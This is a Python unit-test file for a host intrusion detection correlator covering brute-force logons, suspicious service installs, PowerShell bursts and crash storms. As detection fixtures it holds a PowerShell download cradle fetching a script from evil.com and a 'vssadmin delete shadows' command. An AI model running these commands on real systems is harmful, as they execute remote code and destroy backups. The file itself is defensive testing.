import datetime
import unittest
from datetime import datetime, timezone, timedelta

from hids.correlator import EventCorrelator, BoundedTimeWindowBuffer
from hids.normalizer import NormalizedEvent
from hids.severity import Severity


class TestCorrelator(unittest.TestCase):
    def setUp(self):
        self.correlator = EventCorrelator(
            failed_logon_threshold=3,
            failed_logon_window_seconds=300,
            service_proc_window_seconds=180,
            powershell_burst_threshold=4,
            powershell_burst_window_seconds=60,
            crash_storm_threshold=3,
            crash_storm_window_seconds=120,
        )
        self.base_time = datetime(2026, 8, 25, 12, 0, 0, tzinfo=timezone.utc)

    def _make_event(self, event_id: int, channel: str, user: str = "", process: str = "", data: dict = None, seconds_offset: int = 0, record_id: int = 1):
        dt = self.base_time + timedelta(seconds=seconds_offset)
        return NormalizedEvent(
            event_id=event_id,
            channel=channel,
            user=user,
            process=process,
            computer="TEST-HOST",
            record_id=record_id,
            timestamp=dt.isoformat(),
            timestamp_dt=dt,
            event_data=data or {},
        )

    def test_corr_001_brute_force_success(self):
        # 3 Failed logons for Alice
        e1 = self._make_event(4625, "Security", user="CORP\\alice", data={"IpAddress": "10.0.0.5"}, seconds_offset=0, record_id=101)
        e2 = self._make_event(4625, "Security", user="CORP\\alice", data={"IpAddress": "10.0.0.5"}, seconds_offset=10, record_id=102)
        e3 = self._make_event(4625, "Security", user="CORP\\alice", data={"IpAddress": "10.0.0.5"}, seconds_offset=20, record_id=103)

        self.assertEqual(len(self.correlator.process_event(e1)), 0)
        self.assertEqual(len(self.correlator.process_event(e2)), 0)
        self.assertEqual(len(self.correlator.process_event(e3)), 0)

        # Successful logon for Alice triggers CORR-001
        e_succ = self._make_event(4624, "Security", user="CORP\\alice", data={"IpAddress": "10.0.0.5"}, seconds_offset=30, record_id=104)
        alerts = self.correlator.process_event(e_succ)

        self.assertEqual(len(alerts), 1)
        alert = alerts[0]
        self.assertEqual(alert.correlation_id, "CORR-001")
        self.assertEqual(alert.severity, Severity.CRITICAL)
        self.assertEqual(len(alert.events), 4)

        # Another immediate logon should NOT re-trigger
        e_succ2 = self._make_event(4624, "Security", user="CORP\\alice", seconds_offset=35, record_id=105)
        self.assertEqual(len(self.correlator.process_event(e_succ2)), 0)

    def test_corr_001_unrelated_users_not_correlated(self):
        # 2 failures for Bob, 1 for Charlie
        e1 = self._make_event(4625, "Security", user="CORP\\bob", seconds_offset=0, record_id=201)
        e2 = self._make_event(4625, "Security", user="CORP\\bob", seconds_offset=10, record_id=202)
        e3 = self._make_event(4625, "Security", user="CORP\\charlie", seconds_offset=20, record_id=203)

        self.correlator.process_event(e1)
        self.correlator.process_event(e2)
        self.correlator.process_event(e3)

        # Success for Charlie (only 1 failure previously, below threshold of 3)
        e_succ_charlie = self._make_event(4624, "Security", user="CORP\\charlie", seconds_offset=30, record_id=204)
        self.assertEqual(len(self.correlator.process_event(e_succ_charlie)), 0)

    def test_corr_002_service_install_and_suspicious_process(self):
        # Service install
        e_svc = self._make_event(
            7045, "System",
            data={"ServiceName": "RansomSvc", "ImagePath": "C:\\temp\\backdoor.exe"},
            seconds_offset=0, record_id=301
        )
        self.assertEqual(len(self.correlator.process_event(e_svc)), 0)

        # Benign process (notepad) should NOT trigger
        e_benign = self._make_event(
            4688, "Security",
            data={"CommandLine": "notepad.exe C:\\notes.txt"},
            seconds_offset=5, record_id=302
        )
        self.assertEqual(len(self.correlator.process_event(e_benign)), 0)

        # Suspicious command execution
        e_proc = self._make_event(
            4688, "Security",
            data={"CommandLine": "vssadmin delete shadows /all /quiet"},
            seconds_offset=10, record_id=303
        )
        alerts = self.correlator.process_event(e_proc)

        self.assertEqual(len(alerts), 1)
        self.assertEqual(alerts[0].correlation_id, "CORR-002")
        self.assertEqual(alerts[0].severity, Severity.CRITICAL)

    def test_corr_003_powershell_burst(self):
        # 4 PowerShell script block events within 30s with download cradle
        for i in range(3):
            e = self._make_event(
                4104, "Microsoft-Windows-PowerShell/Operational",
                user="Admin",
                data={"ScriptBlockText": "Get-Process"},
                seconds_offset=i * 5, record_id=400 + i
            )
            self.assertEqual(len(self.correlator.process_event(e)), 0)

        # 4th event with download cradle
        e4 = self._make_event(
            4104, "Microsoft-Windows-PowerShell/Operational",
            user="Admin",
            data={"ScriptBlockText": "IEX (New-Object Net.WebClient).DownloadString('http://evil.com/a.ps1')"},
            seconds_offset=20, record_id=404
        )
        alerts = self.correlator.process_event(e4)
        self.assertEqual(len(alerts), 1)
        self.assertEqual(alerts[0].correlation_id, "CORR-003")
        self.assertEqual(alerts[0].severity, Severity.HIGH)

    def test_corr_004_service_crash_storm(self):
        # 3 service crash events in 30 seconds
        e1 = self._make_event(7034, "System", data={"ServiceName": "SvcA"}, seconds_offset=0, record_id=501)
        e2 = self._make_event(7031, "System", data={"ServiceName": "SvcB"}, seconds_offset=10, record_id=502)
        e3 = self._make_event(7034, "System", data={"ServiceName": "SvcC"}, seconds_offset=20, record_id=503)

        self.assertEqual(len(self.correlator.process_event(e1)), 0)
        self.assertEqual(len(self.correlator.process_event(e2)), 0)

        alerts = self.correlator.process_event(e3)
        self.assertEqual(len(alerts), 1)
        self.assertEqual(alerts[0].correlation_id, "CORR-004")
        self.assertEqual(alerts[0].severity, Severity.HIGH)

    def test_ttl_expiry(self):
        buffer = BoundedTimeWindowBuffer(ttl_seconds=60, max_keys=10)
        e1 = self._make_event(4625, "Security", seconds_offset=0)
        buffer.add("test_key", e1, now_ts=100.0)

        # Within TTL
        self.assertEqual(len(buffer.get_events("test_key", now_ts=130.0)), 1)

        # After TTL
        self.assertEqual(len(buffer.get_events("test_key", now_ts=170.0)), 0)


if __name__ == "__main__":
    unittest.main()
